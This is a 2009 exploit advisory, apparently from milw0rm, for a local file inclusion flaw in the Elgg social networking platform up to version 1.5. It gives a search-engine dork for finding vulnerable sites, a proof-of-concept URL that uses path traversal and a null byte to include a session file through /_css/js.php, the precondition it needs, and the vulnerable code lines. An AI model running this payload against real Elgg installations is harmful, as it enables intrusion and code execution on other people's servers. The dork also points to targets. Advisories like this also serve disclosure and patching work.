@@ -1,0 +1,33 @@
+Product: elgg.org
+Version: <= 1.5
+Dork: "Powered by Elgg, the leading open source social networking platform"
+
+eLwaux(c)2009
+UASC.org.UA
+
+POC: /_css/js.php?js=../../../../tmp/session_dir%00&viewtype=xD
+
+need: in table `datalists` must be record `simplecache_enabled` = 0
+(default  `simplecache_enabled ` = 1)
+
+Vulnerability Code:
+-----------------------------------------------------------------------
+/_css/js.php:
+     33:     $viewinput['view'] = 'js/' . $_GET['js'];
+     42:     require_once(dirname(dirname(__FILE__)) . '/simplecache/view.php');
+/simplecache/view.php:
+     26:     $view = $viewinput['view'];
+     30:     if (@mysql_select_db($CONFIG->dbname,$mysql_dblink)) {
+     48:         if ($simplecache_enabled || $override) {
+     49:             $filename = $dataroot . 'views_simplecache/' .  md5($viewtype . $view);
+     51:             $contents = file_get_contents($filename);
+     56:         } else {
+     59:             $contents = elgg_view($view);
+/lib/elgglib.php:
+     237:    function elgg_view($view, ..
+     317:        foreach($viewlist as $priority => $view) {
+     321:                if (file_exists($view_location .  "{$viewtype}/{$view}.php") &&
+                             !include($view_location .  "{$viewtype}/{$view}.php")) {
+-----------------------------------------------------------------------
+
+# milw0rm.com [2009-08-04]
